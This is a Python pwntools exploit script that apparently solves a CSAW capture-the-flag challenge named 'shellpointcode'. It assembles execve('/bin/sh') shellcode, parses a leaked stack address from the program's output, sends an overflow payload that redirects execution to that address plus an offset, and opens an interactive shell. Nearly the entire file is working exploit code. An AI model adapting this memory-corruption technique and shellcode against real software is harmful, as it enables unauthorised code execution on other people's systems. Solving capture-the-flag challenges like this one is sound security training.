
#!/usr/bin/env python3
from pwn import *
context(arch="amd64")



#r = remote("pwn.chal.csaw.io", 9005)
r = process('./shellpointcode')
# gdb.attach(r, '''

# break *0x000055555555496a

# ''')

sc = """
    mov rdi, rsp
    /* call execve('rsp', 0, 0) */
    push 0x3b
    pop rax
    xor rsi, rsi 
    xor rdx, rdx
    syscall
"""
r.sendline(asm(sc))
print(asm(sc))
r.sendline("x")
r.recvuntil("node.next: ")

leak = int(r.recv(14)[2:], 16)
r.sendline("a" * 11 + p64(leak + 0x28) + "/bin/sh\x00")

r.interactive()